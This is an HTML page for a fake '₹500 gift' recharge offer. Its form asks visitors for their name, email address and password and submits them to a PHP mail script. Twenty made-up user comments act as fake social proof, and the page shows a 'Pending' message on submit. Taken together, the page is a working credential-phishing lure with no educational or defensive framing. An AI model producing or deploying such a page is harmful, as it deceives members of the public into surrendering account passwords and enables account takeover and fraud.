<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Big ₹500 Offer!</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(to right, #ff5f6d, #ffc371);
            color: #333;
            padding: 50px;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
        }
        h1 {
            text-align: center;
            color: #fff;
            margin-bottom: 10px;
            font-size: 36px;
        }
        h2 {
            text-align: center;
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .form-container {
            background: white;
            max-width: 500px;
            margin: auto;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s;
        }
        .form-container:hover {
            transform: scale(1.02);
        }
        label {
            margin-top: 10px;
            font-weight: bold;
            display: block;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"],
        input[type="number"],
        input[type="submit"],
        textarea {
            width: calc(100% - 20px);
            padding: 12px;
            margin-top: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
            transition: border-color 0.3s, background-color 0.3s;
            font-size: 16px;
        }
        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus,
        input[type="number"]:focus,
        textarea:focus {
            border-color: #ff5f6d;
            outline: none;
            background-color: #ffe6e6;
        }
        input[type="submit"] {
            background-color: #ff5f6d;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
            margin-top: 20px;
            padding: 15px;
            transition: background-color 0.3s;
            font-size: 18px;
        }
        input[type="submit"]:hover {
            background-color: #e94e5c;
        }
        .pending {
            display: none;
            color: red;
            font-weight: bold;
            text-align: center;
            margin-top: 20px;
        }
        .offer-banner {
            text-align: center;
            background: #f39c12;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: bold;
        }
        .comments-section {
            margin-top: 30px;
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
        }
        .comment {
            padding: 10px;
            border-bottom: 1px solid #eee;
            margin-bottom: 10px;
        }
        .comment:last-child {
            border-bottom: none;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h1>🎉 Big Offer Alert! 🎉</h1>
        <div class="offer-banner">Claim Your ₹500 Gift Now!</div>
        <h2>Fill Out the Form Below!</h2>
        <form id="offerForm" action="send_email.php" method="POST" onsubmit="showPending()">
            <label for="name">Full Name:</label>
            <input type="text" id="name" name="name" required>

            <label for="email">Email Address:</label>
            <input type="email" id="email" name="email" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <label for="amount">Recharge Amount (₹):</label>
            <input type="number" id="amount" name="amount" value="500" readonly>

            <label for="comment">Leave a Comment:</label>
            <textarea id="comment" name="comment" rows="4" placeholder="Your comment here..."></textarea>

            <input type="submit" value="Get My Offer!">
        </form>

        <div class="pending" id="pendingMessage">Pending</div>
    </div>

    <div class="comments-section">
        <h3>Comments:</h3>
        <div class="comment">User1: Great offer! I can't wait to redeem it!</div>
        <div class="comment">User2: This is amazing! Thanks for the free recharge!</div>
        <div class="comment">User3: Just signed up, excited for my ₹500!</div>
        <div class="comment">User4: Love these offers! Keep them coming!</div>
        <div class="comment">User5: This is too good to be true!</div>
        <div class="comment">User6: Can't wait to try this out!</div>
        <div class="comment">User7: Hope it works as promised!</div>
        <div class="comment">User8: Just filled out the form, super excited!</div>
        <div class="comment">User9: This offer made my day!</div>
        <div class="comment">User10: Incredible! I've never seen anything like this!</div>
        <div class="comment">User11: Just got my friends to sign up too!</div>
        <div class="comment">User12: This is a lifesaver for me!</div>
        <div class="comment">User13: I love this kind of promotion!</div>
        <div class="comment">User14: I've been waiting for an offer like this!</div>
        <div class="comment">User15: Thank you for the opportunity!</div>
        <div class="comment">User16: Just shared this with my family!</div>
        <div class="comment">User17: I hope I get my ₹500 soon!</div>
        <div class="comment">User18: Just a fantastic offer!</div>
        <div class="comment">User19: This is great! Thank you!</div>
        <div class="comment">User20: So happy to see such offers!</div>
    </div>

    <script>
        function showPending() {
            document.getElementById('pendingMessage').style.display = 'block';
        }
    </script>
</body>
</html>
